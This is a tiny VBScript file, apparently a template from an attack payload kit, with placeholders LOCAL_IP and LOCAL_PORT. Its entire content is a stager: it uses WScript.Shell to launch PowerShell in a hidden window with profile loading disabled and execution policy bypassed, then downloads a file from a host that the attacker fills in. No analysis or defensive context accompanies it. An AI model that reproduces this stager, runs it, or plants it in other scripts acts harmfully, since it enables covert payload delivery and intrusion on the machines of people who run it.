Dim objShell
Set objShell = WScript.CreateObject("WScript.Shell")
command = "powershell -nop -exec bypass iwr http://LOCAL_IP:LOCAL_PORT/HTTP_07_powershell.vbs"
objShell.Run command,0

